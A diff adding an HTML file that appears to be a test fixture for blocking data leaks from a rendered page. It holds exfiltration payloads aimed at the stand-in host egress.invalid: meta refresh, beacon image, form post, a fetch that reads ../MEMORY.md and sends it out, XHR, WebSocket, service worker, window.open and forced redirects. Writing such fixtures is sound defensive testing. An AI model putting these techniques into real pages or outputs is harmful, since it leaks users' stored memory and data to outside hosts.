@@ -1,0 +1,24 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="refresh" content="0;url=https://egress.invalid/meta?data=MEMORY">
+  <base href="https://egress.invalid/">
+  <link rel="manifest" href="https://egress.invalid/manifest.json">
+</head>
+<body>
+  <img src="https://egress.invalid/beacon?data=MEMORY">
+  <img src="../MEMORY.md">
+  <form action="https://egress.invalid/form" method="post"><input name="data" value="MEMORY"></form>
+  <iframe src="https://egress.invalid/frame"></iframe>
+  <object data="../MEMORY.md"></object>
+  <script>
+    fetch('../MEMORY.md').then(r => r.text()).then(data => fetch('https://egress.invalid/fetch?data=' + data));
+    const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://egress.invalid/xhr'); xhr.send('MEMORY');
+    new WebSocket('wss://egress.invalid/socket');
+    navigator.serviceWorker.register('./sw.js');
+    window.open('https://egress.invalid/window?data=MEMORY');
+    location.href = 'custom-scheme://steal?data=MEMORY';
+    top.location = 'https://egress.invalid/top?data=MEMORY';
+  </script>
+</body>
+</html>
